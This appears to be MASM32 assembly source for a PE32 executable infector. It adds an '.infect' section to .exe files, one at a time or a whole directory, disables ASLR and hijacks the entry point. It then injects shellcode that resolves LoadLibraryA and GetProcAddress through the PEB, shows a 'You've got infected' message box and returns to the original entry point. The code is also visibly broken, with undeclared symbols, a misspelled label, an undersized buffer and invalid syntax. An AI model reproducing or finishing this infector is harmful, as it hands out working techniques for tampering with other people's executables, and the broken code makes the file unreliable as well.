  .486
  .model flat, stdcall
  option casemap:none

  include c:\masm32\include\windows.inc
  include c:\masm32\macros\macros.asm

  include c:\masm32\include\masm32.inc
  include c:\masm32\include\gdi32.inc
  include c:\masm32\include\user32.inc
  include c:\masm32\include\kernel32.inc


  includelib c:\masm32\lib\masm32.lib
  includelib c:\masm32\lib\gdi32.lib
  includelib c:\masm32\lib\user32.lib
  includelib c:\masm32\lib\kernel32.lib

  .data 
    fileArg db "-f", 0
    directoryArg db "-d", 0
    recoverArg db "-r", 0
    doRecover db 0
    usageMsg db "A simple utility for infecting Message Box into any PE32 EXE file", 0
    exampleMsg db "Example: -f <file.exe> -r", 0
    usageDesc db "Usage Description", 0
    fileDesc db "-f Infect Message Box into only one file", 0
    dirDesc db "-d Infect Message Box into one directory", 0
    recoverDesc db "-r Recover file to original state", 0

  .code
  
start:
  call main
  exit

main proc
  LOCAL cmdline:DWORD
  LOCAL cmdlen:DWORD
  
  ;Get command line
  invoke GetCommandLine
  mov cmdline, eax

  invoke lstrlen, cmdline
  mov cmdlen, eax
  cmp cmdlen, 2
  jl _printUsage

  ; Check for "-r" argument
  invoke InString, eax, offset recoverArg
  cmp eax, 0
  jne _setRecover

  invoke InString, eax, offset fileArg
  cmp eax, 0
  jne _openFile

  invoke InString, eax, offset directoryArg
  cmp eax, 0
  jne _openDirectory

_printUsage:
  print offset usagaMsg
  print offset exampleMsg
  print offset usageDesc
  print offset fileDesc
  print offset dirDesc
  print offset recoverDesc
  jmp _exit
_setRecover:
  
_openFile:
  invoke OpenFile
  jmp _exit

_openDirectory:
  invoke OpenDirectory
  jmp _exit

_exit:
  invoke ExitProcess, 0


  ret
main endp

align proc size:DWORD, align:DWORD, address:DWORD
  ; Calculate size % align
  mov eax, size
  xor edx, edx
  div align

  ; If size % align == 0, return address + size
  test edx, edx
  jz _return_address_plus_size

  ; Otherwise, return address + (size / align + 1) * align
  inc eax
  imul eax, align
  add eax, address
  ret

_return_address_plus_size:
  add eax, address
  ret
align endp

OpenFile proc fileName:DWORD
  LOCAL hFile:DWORD
  LOCAL fileSize:DWORD
  LOCAL pByte:DWORD
  LOCAL byteWritten:DWORD
  LOCAL pDosHeader:DWORD
  LOCAL pNtHeader:DWORD

  invoke CreateFile, fileName, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
  mov hFile, eax
  cmp eax, INVALID_HANDLE_VALUE
  je _exit

  invoke GetFileSize, hFile, NULL
  mov fileSize, eax
  cmp eax, 0
  je _closeHandle

  invoke GlobalAlloc, GMEM_FIXED, fileSize
  mov pByte, eax

  invoke ReadFile, hFile, pByte, fileSize, addr byteWritten, NULL
  cmp eax, 0
  je _closeHandle

  mov eax, pByte
  mov pDosHeader, eax
  cmp word ptr [eax], IMAGE_DOS_SIGNATURE
  jne _closeHandle

  add eax, [eax + 3Ch]
  mov pNtHeader, eax
  cmp word ptr [eax + 4], IMAGE_FILE_MACHINE_I386
  jne _closeHandle

  invoke CreateNewSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten, 400
  cmp eax, 0
  je _closeHandle

  invoke InfectSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten
  cmp eax, 0
  je _closeHandle

_closeHandle:
  invoke CloseHandle, hFile

_exit:
  ret
OpenFile endp

OpenDirectory proc pathDirectory:DWORD
  LOCAL hFind:HANDLE
  LOCAL findData:WIN32_FIND_DATA
  LOCAL filePath[260]:BYTE
  LOCAL countFile:DWORD

  mov countFile, 0

  invoke lstrcpy, addr filePath, pathDirectory
  invoke lstrcat, addr filePath, "\*.exe"

  invoke FindFirstFile, addr filePath, addr findData
  cmp eax, INVALID_HANDLE_VALUE
  je _exit
  mov hFind, eax

_nextFile:
  invoke OpenFile, addr findData.cFileName
  inc countFile

  invoke FindNextFile, hFind, addr findData
  cmp eax, 0
  jne _nextFile

  invoke FindClose, hFind

  cmp countFile, 0
  je _exit

  mov eax, 1
  ret

_exit:
  xor eax, eax
  ret
OpenDirectory endp



CreateNewSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD, sizeOfSection:DWORD
  ; Get the first section headerI
  invoke IMAGE_FIRST_SECTION, pNtHeader
  mov ebx, eax

  ; Get the number of sections
  mov eax, pNtHeader
  add eax, 6 ; Offset of NumberOfSections in IMAGE_FILE_HEADER
  movzx ecx, word ptr [eax]

  ; Section name
  push ".infect"
  pop esi

  ; Check if the section already exists
  xor edx, edx
_checkSection:
  mov eax, [ebx + edx * 40] ; Offset of Name in IMAGE_SECTION_HEADER
  cmp eax, esi
  je _sectionExists
  inc edx
  cmp edx, ecx
  jl _checkSection

  ; Initialize the new section header
  lea eax, [ebx + ecx * 40]
  invoke ZeroMemory, eax, 40
  mov [eax], esi

  ; Set the section attributes
  invoke align, sizeOfSection, [pNtHeader + 56], 0
  mov [eax + 8], eax ; Offset of Misc.VirtualSize in IMAGE_SECTION_HEADER
  invoke align, [ebx + (ecx - 1) * 40 + 8], [pNtHeader + 56], [ebx + (ecx - 1) * 40 + 12]
  mov [eax + 12], eax ; Offset of VirtualAddress in IMAGE_SECTION_HEADER
  invoke align, sizeOfSection, [pNtHeader + 60], 0
  mov [eax + 16], eax ; Offset of SizeOfRawData in IMAGE_SECTION_HEADER
  invoke align, [ebx + (ecx - 1) * 40 + 16], [pNtHeader + 60], [ebx + (ecx - 1) * 40 + 20]
  mov [eax + 20], eax ; Offset of PointerToRawData in IMAGE_SECTION_HEADER
  mov dword ptr [eax + 36], 0E00000E0h ; Offset of Characteristics in IMAGE_SECTION_HEADER

  ; Update the file
  invoke SetFilePointer, hFile, [eax + 20] + [eax + 16], 0, FILE_BEGIN
  invoke SetEndOfFile, hFile
  add [pNtHeader + 80], [eax + 12] + [eax + 8] ; Offset of SizeOfImage in IMAGE_OPTIONAL_HEADER
  inc word ptr [pNtHeader + 6]
  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN
  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0
  mov eax, 1
  ret

_sectionExists:
  invoke CloseHandle, hFile
  xor eax, eax
  ret
CreateNewSection endp

InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD

  ; Get the first and last section
  mov eax, [pNtHeader]
  add eax, sizeof IMAGE_NT_HEADERS
  mov ecx, [pNtHeader + 6] ; NumberOfSections
  dec ecx
  imul ecx, sizeof IMAGE_SECTION_HEADER
  add eax, ecx
  mov [lastSection], eax

  ; Set file pointer to the beginning
  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN

  ; Save the OEP
  mov eax, [pNtHeader + 40] ; AddressOfEntryPoint
  add eax, [pNtHeader + 34] ; ImageBase
  mov [OEP], eax

  ; Disable ASLR
  and dword ptr [pNtHeader + 70], not IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE

  ; Change the EP to point to the last section created
  mov eax, [lastSection]
  mov eax, [eax]
  mov [pNtHeader + 40], eax ; AddressOfEntryPoint

  ; Write the file
  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0

  ; Obtain the opcodes
  mov eax, offset loc1
  mov [start], eax
  jmp over
  loc1:
  mov eax, fs:[30h]
  mov eax, [eax + 0Ch] ; PEB
  mov eax, [eax + 0Ch] ; Ldr
  mov eax, [eax + 14h] ; InInitializationOrderModuleList
  mov eax, [eax] ; First module
  mov eax, [eax] ; Second module
  mov eax, [eax + 10h] ; Base address

  mov ebx, eax; Take the base address of kernel32
  mov eax, [ebx + 0x3c]; PE header VMA
  mov   edi, [ebx + eax + 0x78]; Export table relative offset
  add   edi, ebx; Export table VMA
  mov   ecx, [edi + 0x18]; Number of names

  mov   edx, [edi + 0x20]; Names table relative offset
  add   edx, ebx; Names table VMA
  // now lets look for a function named LoadLibraryA

  LLA :
  dec ecx
      mov esi, [edx + ecx * 4]; Store the relative offset of the name
      add esi, ebx; Set esi to the VMA of the current name
      cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
      je LLALOOP1
  LLALOOP1 :
  cmp dword ptr[esi + 4], 0x7262694c
      ;L(4c)i(69)b(62)r(72)
      je LLALOOP2
  LLALOOP2 :
  cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
      je stop; if its = then jump to stop because we found it
      jmp LLA; Load Libr aryA
  stop :
  mov   edx, [edi + 0x24]; Table of ordinals relative
      add   edx, ebx; Table of ordinals
      mov   cx, [edx + 2 * ecx]; function ordinal
      mov   edx, [edi + 0x1c]; Address table relative offset
      add   edx, ebx; Table address
      mov   eax, [edx + 4 * ecx]; ordinal offset
      add   eax, ebx; Function VMA
      // EAX holds address of LoadLibraryA now


      sub esp, 11
      mov ebx, esp
      mov byte ptr[ebx], 0x75; u
      mov byte ptr[ebx + 1], 0x73; s
      mov byte ptr[ebx + 2], 0x65; e
      mov byte ptr[ebx + 3], 0x72; r
      mov byte ptr[ebx + 4], 0x33; 3
      mov byte ptr[ebx + 5], 0x32; 2
      mov byte ptr[ebx + 6], 0x2e; .
      mov byte ptr[ebx + 7], 0x64; d
      mov byte ptr[ebx + 8], 0x6c; l
      mov byte ptr[ebx + 9], 0x6c; l
      mov byte ptr[ebx + 10], 0x0

      push ebx

      //lets call LoadLibraryA with user32.dll as argument
      call eax;
      add esp, 11
      //save the return address of LoadLibraryA for later use in GetProcAddress
      push eax


      // now we look again for a function named GetProcAddress
      mov eax, fs:[30h]
      mov eax, [eax + 0x0c]; 12
      mov eax, [eax + 0x14]; 20
      mov eax, [eax]
      mov eax, [eax]
      mov eax, [eax + 0x10]; 16

      mov   ebx, eax; Take the base address of kernel32
      mov   eax, [ebx + 0x3c]; PE header VMA
      mov   edi, [ebx + eax + 0x78]; Export table relative offset
      add   edi, ebx; Export table VMA
      mov   ecx, [edi + 0x18]; Number of names

      mov   edx, [edi + 0x20]; Names table relative offset
      add   edx, ebx; Names table VMA
  GPA :
  dec ecx
      mov esi, [edx + ecx * 4]; Store the relative offset of the name
      add esi, ebx; Set esi to the VMA of the current name
      cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
      je GPALOOP1
  GPALOOP1 :
  cmp dword ptr[esi + 4], 0x41636f72
      // backwards remember : ) r(72)o(6f)c(63)A(41)
      je GPALOOP2
  GPALOOP2 :
  cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
      //no need to continue to look further cause there is no other function starting with GetProcAddre
      je stp; if its = then jump to stop because we found it
      jmp GPA
  stp :
      mov   edx, [edi + 0x24]; Table of ordinals relative
      add   edx, ebx; Table of ordinals
      mov   cx, [edx + 2 * ecx]; function ordinal
      mov   edx, [edi + 0x1c]; Address table relative offset
      add   edx, ebx; Table address
      mov   eax, [edx + 4 * ecx]; ordinal offset
      add   eax, ebx; Function VMA
      // EAX HOLDS THE ADDRESS OF GetProcAddress
      mov esi, eax

      sub esp, 12
      mov ebx, esp
      mov byte ptr[ebx], 0x4d //M
      mov byte ptr[ebx + 1], 0x65 //e
      mov byte ptr[ebx + 2], 0x73 //s
      mov byte ptr[ebx + 3], 0x73 //s
      mov byte ptr[ebx + 4], 0x61 //a
      mov byte ptr[ebx + 5], 0x67 //g
      mov byte ptr[ebx + 6], 0x65 //e
      mov byte ptr[ebx + 7], 0x42 //B
      mov byte ptr[ebx + 8], 0x6f //o
      mov byte ptr[ebx + 9], 0x78 //x
      mov byte ptr[ebx + 10], 0x41 //A
      mov byte ptr[ebx + 11], 0x0

      /*
          get back the value saved from LoadLibraryA return
          So that the call to GetProcAddress is:
          esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
      */

      mov eax, [esp + 12]
      push ebx; MessageBoxA
      push eax; base address of user32.dll retrieved by LoadLibraryA
      call esi; GetProcAddress address :))
      add esp, 12

  sub esp, 8
  mov ebx, esp
  mov byte ptr[ebx], 89;      Y
  mov byte ptr[ebx + 1], 111; o
  mov byte ptr[ebx + 2], 117; u
  mov byte ptr[ebx + 3], 39; `
  mov byte ptr[ebx + 4], 118; v
  mov byte ptr[ebx + 5], 101; e
  mov byte ptr[ebx + 6], 32; 
  mov byte ptr[ebx + 7], 103; g
  mov byte ptr[ebx + 8], 111; o
  mov byte ptr[ebx + 9], 116; t
  mov byte ptr[ebx + 10], 32; 
  mov byte ptr[ebx + 11], 105; i
  mov byte ptr[ebx + 12], 110; n
  mov byte ptr[ebx + 13], 102; f
  mov byte ptr[ebx + 14], 101; e
  mov byte ptr[ebx + 15], 99;  c
  mov byte ptr[ebx + 16], 116; t
  mov byte ptr[ebx + 17], 101; e
  mov byte ptr[ebx + 18], 100; d
  mov byte ptr[ebx + 19], 0


  push 0
  push 0
  push ebx
  push 0
  call eax
  add esp, 8

  mov eax, 0xdeadbeef ;Original Entry point
  jmp eax
over:
  ret

InfectSection endp


end start

